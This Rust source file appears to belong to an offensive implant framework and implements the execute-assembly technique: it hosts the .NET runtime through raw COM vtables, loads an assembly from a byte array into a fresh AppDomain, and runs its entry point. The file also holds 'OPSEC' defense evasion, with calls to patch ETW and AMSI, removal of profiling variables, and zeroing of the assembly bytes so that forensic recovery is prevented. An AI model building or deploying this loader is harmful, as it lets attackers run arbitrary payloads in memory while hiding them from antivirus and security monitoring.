//! CLR hosting implementation via COM interfaces
//!
//! Implements the execute-assembly technique using:
//! - ICLRMetaHost for runtime enumeration
//! - ICLRRuntimeInfo for runtime loading
//! - ICorRuntimeHost for AppDomain management
//! - _AppDomain::Load_3 for byte-array assembly loading
//! - _MethodInfo::Invoke_3 for entry point invocation
//!
//! Reference: mscoree.h, mscorlib.tlb

#![cfg(windows)]

use crate::error::DotNetError;
use crate::output::OutputCapture;
use crate::{ExecuteAssemblyRequest, ExecuteAssemblyResult, Result};

use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr;
use std::time::Instant;

use windows_sys::core::GUID;
use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::System::Com::*;
use windows_sys::Win32::System::Ole::*;
use windows_sys::Win32::System::Variant::*;

// CLR GUIDs
const CLSID_CLR_META_HOST: GUID = GUID {
    data1: 0x9280188d,
    data2: 0x0e8e,
    data3: 0x4867,
    data4: [0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde],
};

const IID_ICLR_META_HOST: GUID = GUID {
    data1: 0xd332db9e,
    data2: 0xb9b3,
    data3: 0x4125,
    data4: [0x82, 0x07, 0xa1, 0x48, 0x84, 0xf5, 0x32, 0x16],
};

const IID_ICLR_RUNTIME_INFO: GUID = GUID {
    data1: 0xbd39d1d2,
    data2: 0xba2f,
    data3: 0x486a,
    data4: [0x89, 0xb0, 0xb4, 0xb0, 0xcb, 0x46, 0x68, 0x91],
};

const CLSID_COR_RUNTIME_HOST: GUID = GUID {
    data1: 0xcb2f6723,
    data2: 0xab3a,
    data3: 0x11d2,
    data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
};

const IID_ICOR_RUNTIME_HOST: GUID = GUID {
    data1: 0xcb2f6722,
    data2: 0xab3a,
    data3: 0x11d2,
    data4: [0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e],
};

/// _AppDomain IID from mscorlib type library
const IID_APP_DOMAIN: GUID = GUID {
    data1: 0x05F696DC,
    data2: 0x2B29,
    data3: 0x3663,
    data4: [0xAD, 0x8B, 0xC4, 0x38, 0x9C, 0xF2, 0xA7, 0x13],
};

// VTable indices for COM interfaces
mod vtable {
    // ICLRMetaHost (IUnknown base = 0,1,2)
    pub const META_HOST_GET_RUNTIME: usize = 3;
    pub const META_HOST_ENUMERATE_RUNTIMES: usize = 4;

    // ICLRRuntimeInfo
    pub const RUNTIME_INFO_GET_INTERFACE: usize = 9;

    // ICorRuntimeHost (IUnknown base = 0,1,2)
    pub const COR_HOST_START: usize = 3;
    pub const COR_HOST_CREATE_DOMAIN: usize = 11;
    pub const COR_HOST_UNLOAD_DOMAIN: usize = 12;
    pub const COR_HOST_GET_DEFAULT_DOMAIN: usize = 13;
}

/// _AppDomain vtable offsets
/// Layout: IUnknown(3) + IDispatch(4) + _AppDomain methods
/// Load_3 loads from a byte array SAFEARRAY - slot 45 for .NET 4.0
mod appdomain_vtable {
    pub const QUERY_INTERFACE: usize = 0;
    pub const LOAD_3: usize = 45;
}

/// _Assembly vtable offsets
/// Layout: IUnknown(3) + IDispatch(4) + _Assembly methods
mod assembly_vtable {
    pub const GET_ENTRY_POINT: usize = 17;
}

/// _MethodInfo vtable offsets
/// Layout: IUnknown(3) + IDispatch(4) + _MethodInfo methods
mod methodinfo_vtable {
    pub const INVOKE_3: usize = 34;
}

/// External function from mscoree.dll
#[link(name = "mscoree")]
extern "system" {
    fn CLRCreateInstance(
        clsid: *const GUID,
        riid: *const GUID,
        ppInterface: *mut *mut core::ffi::c_void,
    ) -> HRESULT;
}

/// Check if CLR is available on this system
pub fn check_clr_available() -> bool {
    unsafe {
        let mut meta_host: *mut core::ffi::c_void = ptr::null_mut();
        let hr = CLRCreateInstance(
            &CLSID_CLR_META_HOST,
            &IID_ICLR_META_HOST,
            &mut meta_host,
        );

        if hr >= 0 && !meta_host.is_null() {
            // Release
            let release: extern "system" fn(*mut core::ffi::c_void) -> u32 =
                std::mem::transmute(*((*(meta_host as *mut *mut usize)).add(2)));
            release(meta_host);
            true
        } else {
            false
        }
    }
}

/// List installed CLR versions
pub fn list_installed_runtimes() -> Result<Vec<String>> {
    unsafe {
        let mut meta_host: *mut core::ffi::c_void = ptr::null_mut();
        let hr = CLRCreateInstance(
            &CLSID_CLR_META_HOST,
            &IID_ICLR_META_HOST,
            &mut meta_host,
        );

        if hr < 0 {
            return Err(DotNetError::ClrInitFailed(format!(
                "CLRCreateInstance failed: 0x{:08x}",
                hr
            )));
        }

        // For now, return common versions
        // Full implementation would enumerate via ICLRMetaHost::EnumerateInstalledRuntimes
        let versions = vec!["v4.0.30319".to_string(), "v2.0.50727".to_string()];

        // Release meta_host
        let release: extern "system" fn(*mut core::ffi::c_void) -> u32 =
            std::mem::transmute(*((*(meta_host as *mut *mut usize)).add(2)));
        release(meta_host);

        Ok(versions)
    }
}

/// Execute assembly implementation
pub fn execute_assembly_impl(request: ExecuteAssemblyRequest) -> Result<ExecuteAssemblyResult> {
    let start_time = Instant::now();

    // Apply OPSEC mitigations if requested
    if request.opsec {
        apply_opsec_mitigations()?;
    }

    // Initialize COM
    unsafe {
        let hr = CoInitializeEx(ptr::null(), COINIT_MULTITHREADED);
        if hr < 0 && hr != RPC_E_CHANGED_MODE as i32 {
            return Err(DotNetError::ComError(hr));
        }
    }

    // Setup output capture
    let mut output_capture = OutputCapture::new()?;

    // Execute with CLR
    let result = execute_with_clr(&request, &mut output_capture);

    // Capture output
    let (stdout, stderr) = output_capture.get_output();

    let execution_time_ms = start_time.elapsed().as_millis() as u64;

    match result {
        Ok(exit_code) => Ok(ExecuteAssemblyResult {
            success: true,
            exit_code: Some(exit_code),
            stdout,
            stderr,
            error: None,
            execution_time_ms,
        }),
        Err(e) => Ok(ExecuteAssemblyResult {
            success: false,
            exit_code: None,
            stdout,
            stderr,
            error: Some(e.to_string()),
            execution_time_ms,
        }),
    }
}

/// Execute assembly with CLR
fn execute_with_clr(request: &ExecuteAssemblyRequest, output: &mut OutputCapture) -> Result<i32> {
    unsafe {
        // Create ICLRMetaHost
        let mut meta_host: *mut core::ffi::c_void = ptr::null_mut();
        let hr = CLRCreateInstance(
            &CLSID_CLR_META_HOST,
            &IID_ICLR_META_HOST,
            &mut meta_host,
        );

        if hr < 0 {
            return Err(DotNetError::ClrInitFailed(format!(
                "CLRCreateInstance: 0x{:08x}",
                hr
            )));
        }

        let _meta_host_guard = ClrGuard::new(meta_host);

        // Get runtime version
        let version = request.clr_version.as_deref().unwrap_or("v4.0.30319");
        let version_wide = to_wide(version);

        // Get ICLRRuntimeInfo
        let meta_host_vtable = *(meta_host as *mut *mut usize);
        let get_runtime: extern "system" fn(
            *mut core::ffi::c_void,
            *const u16,
            *const GUID,
            *mut *mut core::ffi::c_void,
        ) -> HRESULT =
            std::mem::transmute(*meta_host_vtable.add(vtable::META_HOST_GET_RUNTIME));

        let mut runtime_info: *mut core::ffi::c_void = ptr::null_mut();
        let hr = get_runtime(
            meta_host,
            version_wide.as_ptr(),
            &IID_ICLR_RUNTIME_INFO,
            &mut runtime_info,
        );

        if hr < 0 {
            return Err(DotNetError::RuntimeNotFound(format!(
                "{} (0x{:08x})",
                version, hr
            )));
        }

        let _runtime_guard = ClrGuard::new(runtime_info);

        // Get ICorRuntimeHost
        let runtime_vtable = *(runtime_info as *mut *mut usize);
        let get_interface: extern "system" fn(
            *mut core::ffi::c_void,
            *const GUID,
            *const GUID,
            *mut *mut core::ffi::c_void,
        ) -> HRESULT =
            std::mem::transmute(*runtime_vtable.add(vtable::RUNTIME_INFO_GET_INTERFACE));

        let mut cor_host: *mut core::ffi::c_void = ptr::null_mut();
        let hr = get_interface(
            runtime_info,
            &CLSID_COR_RUNTIME_HOST,
            &IID_ICOR_RUNTIME_HOST,
            &mut cor_host,
        );

        if hr < 0 {
            return Err(DotNetError::ClrInitFailed(format!(
                "GetInterface: 0x{:08x}",
                hr
            )));
        }

        let _cor_guard = ClrGuard::new(cor_host);

        // Start runtime
        let cor_vtable = *(cor_host as *mut *mut usize);
        let start: extern "system" fn(*mut core::ffi::c_void) -> HRESULT =
            std::mem::transmute(*cor_vtable.add(vtable::COR_HOST_START));

        let hr = start(cor_host);
        if hr < 0 && hr != 0x80131520 {
            // Ignore "already started"
            return Err(DotNetError::ClrInitFailed(format!(
                "Start: 0x{:08x}",
                hr
            )));
        }

        // Create isolated AppDomain
        let domain_name = format!("KrakenDomain_{}", std::process::id());
        let domain_name_wide = to_wide(&domain_name);

        let create_domain: extern "system" fn(
            *mut core::ffi::c_void,
            *const u16,
            *mut core::ffi::c_void,
            *mut *mut core::ffi::c_void,
        ) -> HRESULT =
            std::mem::transmute(*cor_vtable.add(vtable::COR_HOST_CREATE_DOMAIN));

        let mut app_domain: *mut core::ffi::c_void = ptr::null_mut();
        let hr = create_domain(
            cor_host,
            domain_name_wide.as_ptr(),
            ptr::null_mut(),
            &mut app_domain,
        );

        if hr < 0 {
            return Err(DotNetError::AppDomainFailed(format!(
                "CreateDomain: 0x{:08x}",
                hr
            )));
        }

        // Execute assembly in the AppDomain
        let result = execute_in_domain(app_domain, request, output);

        // Unload AppDomain (cleanup even on error)
        let unload_domain: extern "system" fn(
            *mut core::ffi::c_void,
            *mut core::ffi::c_void,
        ) -> HRESULT =
            std::mem::transmute(*cor_vtable.add(vtable::COR_HOST_UNLOAD_DOMAIN));

        let _ = unload_domain(cor_host, app_domain);

        result
    }
}

// ---------------------------------------------------------------------------
// SAFEARRAY helpers
// ---------------------------------------------------------------------------

/// Create a SAFEARRAY of bytes (VT_UI1) from assembly data.
///
/// The caller is responsible for calling `SafeArrayDestroy` on the returned
/// pointer when it is no longer needed.
unsafe fn create_byte_safearray(data: &[u8]) -> *mut SAFEARRAY {
    let sa = SafeArrayCreateVector(VT_UI1, 0, data.len() as u32);
    if sa.is_null() {
        return ptr::null_mut();
    }

    let mut pv_data: *mut core::ffi::c_void = ptr::null_mut();
    let hr = SafeArrayAccessData(sa, &mut pv_data);
    if hr < 0 || pv_data.is_null() {
        SafeArrayDestroy(sa);
        return ptr::null_mut();
    }

    core::ptr::copy_nonoverlapping(data.as_ptr(), pv_data as *mut u8, data.len());

    SafeArrayUnaccessData(sa);
    sa
}

/// Create a SAFEARRAY of VARIANT containing a single element: a SAFEARRAY of
/// BSTRs representing the string arguments to pass to `Main(string[] args)`.
///
/// The outer SAFEARRAY is `SAFEARRAY(VARIANT)` with one element whose VARIANT
/// holds `VT_ARRAY | VT_BSTR` pointing to the inner BSTR array.
///
/// Returns `(outer_sa, inner_sa)`. Both must be destroyed by the caller.
/// If `args` is empty, returns a single-element outer SAFEARRAY containing an
/// empty string array (matching how `Main(string[])` receives no arguments).
unsafe fn create_method_args_safearray(
    args: &[String],
) -> (*mut SAFEARRAY, *mut SAFEARRAY) {
    // Inner: SAFEARRAY of BSTR
    let sa_strings = SafeArrayCreateVector(VT_BSTR, 0, args.len() as u32);
    if sa_strings.is_null() {
        return (ptr::null_mut(), ptr::null_mut());
    }

    for (i, arg) in args.iter().enumerate() {
        let wide: Vec<u16> = arg.encode_utf16().chain(std::iter::once(0)).collect();
        // SysAllocStringLen expects length WITHOUT the null terminator
        let bstr = SysAllocStringLen(wide.as_ptr(), arg.len() as u32);
        if !bstr.is_null() {
            let idx = i as i32;
            SafeArrayPutElement(sa_strings, &idx, bstr as *const _);
            // SafeArrayPutElement copies the BSTR, so free our copy
            SysFreeString(bstr);
        }
    }

    // Outer: SAFEARRAY(VARIANT) with one element
    let sa_params = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    if sa_params.is_null() {
        SafeArrayDestroy(sa_strings);
        return (ptr::null_mut(), ptr::null_mut());
    }

    // Build a VARIANT holding the BSTR array
    let mut vt_args: VARIANT = std::mem::zeroed();
    vt_args.Anonymous.Anonymous.vt = VT_ARRAY | VT_BSTR;
    vt_args.Anonymous.Anonymous.Anonymous.parray = sa_strings;

    let idx: i32 = 0;
    SafeArrayPutElement(sa_params, &idx, &vt_args as *const _ as *const _);

    (sa_params, sa_strings)
}

/// Validate that the provided bytes look like a .NET assembly.
///
/// Checks:
/// 1. MZ header (DOS stub)
/// 2. PE signature at the offset stored at 0x3C
/// 3. Minimum size for PE headers
fn validate_assembly_bytes(assembly: &[u8]) -> Result<()> {
    if assembly.is_empty() {
        return Err(DotNetError::AssemblyLoadFailed(
            "empty assembly".to_string(),
        ));
    }

    if assembly.len() < 64 {
        return Err(DotNetError::AssemblyLoadFailed(
            "invalid assembly size".to_string(),
        ));
    }

    // Check MZ header
    if assembly[0] != 0x4D || assembly[1] != 0x5A {
        return Err(DotNetError::AssemblyLoadFailed(
            "invalid PE header (missing MZ)".to_string(),
        ));
    }

    // Read PE offset from DOS header at 0x3C
    let pe_offset = u32::from_le_bytes([
        assembly[60],
        assembly[61],
        assembly[62],
        assembly[63],
    ]) as usize;

    if pe_offset + 24 > assembly.len() {
        return Err(DotNetError::AssemblyLoadFailed(
            "invalid PE structure (truncated)".to_string(),
        ));
    }

    // Check PE signature "PE\0\0"
    if pe_offset + 4 <= assembly.len() {
        if assembly[pe_offset] != b'P'
            || assembly[pe_offset + 1] != b'E'
            || assembly[pe_offset + 2] != 0
            || assembly[pe_offset + 3] != 0
        {
            return Err(DotNetError::AssemblyLoadFailed(
                "invalid PE signature".to_string(),
            ));
        }
    }

    Ok(())
}

/// Extract an i32 from a VARIANT if it holds VT_I4 or VT_INT.
unsafe fn extract_variant_i32(var: &VARIANT) -> Option<i32> {
    let vt = var.Anonymous.Anonymous.vt;
    if vt == VT_I4 || vt == 22 /* VT_INT */ {
        Some(var.Anonymous.Anonymous.Anonymous.lVal)
    } else {
        None
    }
}

// ---------------------------------------------------------------------------
// Core execution
// ---------------------------------------------------------------------------

/// Execute assembly within an AppDomain.
///
/// This is the heart of execute-assembly:
/// 1. QueryInterface for _AppDomain
/// 2. Create SAFEARRAY from assembly bytes
/// 3. _AppDomain::Load_3(SAFEARRAY*) -> _Assembly*
/// 4. _Assembly::get_EntryPoint() -> _MethodInfo*
/// 5. _MethodInfo::Invoke_3(null, args) -> VARIANT result
/// 6. Cleanup: destroy SAFEARRAYs, release COM ptrs, zero assembly memory
unsafe fn execute_in_domain(
    app_domain: *mut core::ffi::c_void,
    request: &ExecuteAssemblyRequest,
    _output: &mut OutputCapture,
) -> Result<i32> {
    // Validate assembly before any COM work
    validate_assembly_bytes(&request.assembly)?;

    tracing::info!(
        assembly_size = request.assembly.len(),
        args = ?request.args,
        "Loading .NET assembly into AppDomain"
    );

    // -----------------------------------------------------------------------
    // Step 1: QueryInterface for _AppDomain
    // -----------------------------------------------------------------------
    let domain_vtable = *(app_domain as *mut *mut usize);
    let qi: extern "system" fn(
        *mut core::ffi::c_void,
        *const GUID,
        *mut *mut core::ffi::c_void,
    ) -> HRESULT =
        std::mem::transmute(*domain_vtable.add(appdomain_vtable::QUERY_INTERFACE));

    let mut p_appdomain: *mut core::ffi::c_void = ptr::null_mut();
    let hr = qi(app_domain, &IID_APP_DOMAIN, &mut p_appdomain);
    if hr < 0 {
        return Err(DotNetError::AppDomainFailed(format!(
            "QI _AppDomain: 0x{:08x}",
            hr
        )));
    }
    let _domain_guard = ClrGuard::new(p_appdomain);

    // -----------------------------------------------------------------------
    // Step 2: Create SAFEARRAY from assembly bytes
    // -----------------------------------------------------------------------
    let sa_assembly = create_byte_safearray(&request.assembly);
    if sa_assembly.is_null() {
        return Err(DotNetError::AssemblyLoadFailed(
            "SAFEARRAY creation failed".to_string(),
        ));
    }

    // -----------------------------------------------------------------------
    // Step 3: _AppDomain::Load_3(SAFEARRAY*) -> _Assembly*
    // -----------------------------------------------------------------------
    let ad_vtable = *(p_appdomain as *mut *mut usize);
    let load_3: extern "system" fn(
        *mut core::ffi::c_void,
        *mut SAFEARRAY,
        *mut *mut core::ffi::c_void,
    ) -> HRESULT =
        std::mem::transmute(*ad_vtable.add(appdomain_vtable::LOAD_3));

    let mut p_assembly: *mut core::ffi::c_void = ptr::null_mut();
    let hr = load_3(p_appdomain, sa_assembly, &mut p_assembly);

    // Destroy the byte SAFEARRAY immediately - assembly is loaded
    SafeArrayDestroy(sa_assembly);

    if hr < 0 {
        return Err(DotNetError::AssemblyLoadFailed(format!(
            "Load_3: 0x{:08x}",
            hr
        )));
    }
    let _asm_guard = ClrGuard::new(p_assembly);

    tracing::debug!("Assembly loaded successfully");

    // -----------------------------------------------------------------------
    // Step 4: _Assembly::get_EntryPoint() -> _MethodInfo*
    // -----------------------------------------------------------------------
    let asm_vtable = *(p_assembly as *mut *mut usize);
    let get_entry_point: extern "system" fn(
        *mut core::ffi::c_void,
        *mut *mut core::ffi::c_void,
    ) -> HRESULT =
        std::mem::transmute(*asm_vtable.add(assembly_vtable::GET_ENTRY_POINT));

    let mut p_method: *mut core::ffi::c_void = ptr::null_mut();
    let hr = get_entry_point(p_assembly, &mut p_method);
    if hr < 0 || p_method.is_null() {
        return Err(DotNetError::EntryPointNotFound(format!(
            "get_EntryPoint: 0x{:08x}",
            hr
        )));
    }
    let _method_guard = ClrGuard::new(p_method);

    tracing::debug!("Entry point obtained");

    // -----------------------------------------------------------------------
    // Step 5: Build args and invoke _MethodInfo::Invoke_3
    // -----------------------------------------------------------------------
    let (sa_params, sa_strings) = create_method_args_safearray(&request.args);
    if sa_params.is_null() {
        return Err(DotNetError::InvocationFailed(
            "failed to create args SAFEARRAY".to_string(),
        ));
    }

    let mi_vtable = *(p_method as *mut *mut usize);
    let invoke_3: extern "system" fn(
        *mut core::ffi::c_void, // this (_MethodInfo*)
        VARIANT,                // obj (null for static Main)
        *mut SAFEARRAY,         // parameters SAFEARRAY(VARIANT)
        *mut VARIANT,           // return value
    ) -> HRESULT =
        std::mem::transmute(*mi_vtable.add(methodinfo_vtable::INVOKE_3));

    // null object for static method invocation
    let null_obj: VARIANT = std::mem::zeroed();
    let mut ret_val: VARIANT = std::mem::zeroed();

    tracing::info!("Invoking assembly entry point");
    let hr = invoke_3(p_method, null_obj, sa_params, &mut ret_val);

    // -----------------------------------------------------------------------
    // Step 6: Cleanup
    // -----------------------------------------------------------------------

    // Destroy the outer params SAFEARRAY
    // Note: sa_strings is owned by the VARIANT inside sa_params; destroying
    // sa_params will handle it via VariantClear semantics. However, since we
    // used raw SafeArrayPutElement with a VARIANT copy, we need to destroy
    // the inner array separately to be safe.
    SafeArrayDestroy(sa_params);
    if !sa_strings.is_null() {
        // sa_strings may have been consumed by the VARIANT copy in sa_params.
        // SafeArrayDestroy on an already-destroyed array is harmless (returns
        // E_INVALIDARG), but we call it to ensure cleanup in all paths.
        let _ = SafeArrayDestroy(sa_strings);
    }

    // Zero assembly bytes in memory for OPSEC
    // Safety: we have a &ExecuteAssemblyRequest which owns the Vec<u8>.
    // We zero the backing memory to prevent forensic recovery. The Vec
    // will be dropped normally by the caller afterward.
    if !request.assembly.is_empty() {
        core::ptr::write_bytes(
            request.assembly.as_ptr() as *mut u8,
            0,
            request.assembly.len(),
        );
    }

    if hr < 0 {
        return Err(DotNetError::InvocationFailed(format!(
            "Invoke_3: 0x{:08x}",
            hr
        )));
    }

    // Extract integer return value if the entry point returned one
    let exit_code = extract_variant_i32(&ret_val).unwrap_or(0);

    tracing::info!(exit_code, "Assembly execution completed");

    Ok(exit_code)
}

/// Apply OPSEC mitigations before CLR initialization
fn apply_opsec_mitigations() -> Result<()> {
    // Patch ETW and AMSI
    #[cfg(feature = "opsec")]
    {
        mod_evasion::patch_etw()?;
        mod_evasion::patch_amsi()?;
    }

    // Clear sensitive environment variables that could enable profiling/tracing
    std::env::remove_var("COMPlus_ETWEnabled");
    std::env::remove_var("COR_ENABLE_PROFILING");
    std::env::remove_var("COR_PROFILER");

    Ok(())
}

/// Convert string to null-terminated wide string
fn to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

/// RAII guard for COM objects - calls IUnknown::Release on drop
struct ClrGuard {
    ptr: *mut core::ffi::c_void,
}

impl ClrGuard {
    fn new(ptr: *mut core::ffi::c_void) -> Self {
        Self { ptr }
    }
}

impl Drop for ClrGuard {
    fn drop(&mut self) {
        if !self.ptr.is_null() {
            unsafe {
                let vtable = *(self.ptr as *mut *mut usize);
                let release: extern "system" fn(*mut core::ffi::c_void) -> u32 =
                    std::mem::transmute(*vtable.add(2));
                release(self.ptr);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_to_wide() {
        let wide = to_wide("test");
        assert_eq!(wide.len(), 5); // "test" + null terminator
        assert_eq!(wide[4], 0);
    }

    #[test]
    fn test_clr_guard_null() {
        // Should not panic with null pointer
        let _guard = ClrGuard::new(ptr::null_mut());
    }

    #[test]
    fn test_validate_assembly_empty() {
        let result = validate_assembly_bytes(&[]);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("empty assembly"));
    }

    #[test]
    fn test_validate_assembly_too_small() {
        let result = validate_assembly_bytes(&[0x4D, 0x5A, 0x00]);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("invalid assembly size"));
    }

    #[test]
    fn test_validate_assembly_bad_magic() {
        let mut data = vec![0u8; 128];
        data[0] = 0x00; // Not MZ
        data[1] = 0x00;
        let result = validate_assembly_bytes(&data);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("missing MZ"));
    }

    #[test]
    fn test_validate_assembly_bad_pe_offset() {
        let mut data = vec![0u8; 128];
        data[0] = 0x4D; // M
        data[1] = 0x5A; // Z
        // PE offset at 0x3C pointing beyond the data
        data[60] = 0xFF;
        data[61] = 0xFF;
        data[62] = 0x00;
        data[63] = 0x00;
        let result = validate_assembly_bytes(&data);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("truncated"));
    }

    #[test]
    fn test_validate_assembly_valid_pe_header() {
        let mut data = vec![0u8; 256];
        data[0] = 0x4D; // M
        data[1] = 0x5A; // Z
        // PE offset at 0x3C = 0x80
        data[60] = 0x80;
        data[61] = 0x00;
        data[62] = 0x00;
        data[63] = 0x00;
        // PE signature at offset 0x80
        data[0x80] = b'P';
        data[0x80 + 1] = b'E';
        data[0x80 + 2] = 0x00;
        data[0x80 + 3] = 0x00;
        let result = validate_assembly_bytes(&data);
        assert!(result.is_ok());
    }

    #[test]
    fn test_validate_assembly_bad_pe_signature() {
        let mut data = vec![0u8; 256];
        data[0] = 0x4D;
        data[1] = 0x5A;
        data[60] = 0x80;
        // Wrong PE signature
        data[0x80] = b'X';
        data[0x80 + 1] = b'X';
        let result = validate_assembly_bytes(&data);
        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("invalid PE signature"));
    }

    #[test]
    fn test_extract_variant_zeroed() {
        unsafe {
            let var: VARIANT = std::mem::zeroed();
            // VT_EMPTY = 0, so should return None
            assert_eq!(extract_variant_i32(&var), None);
        }
    }
}
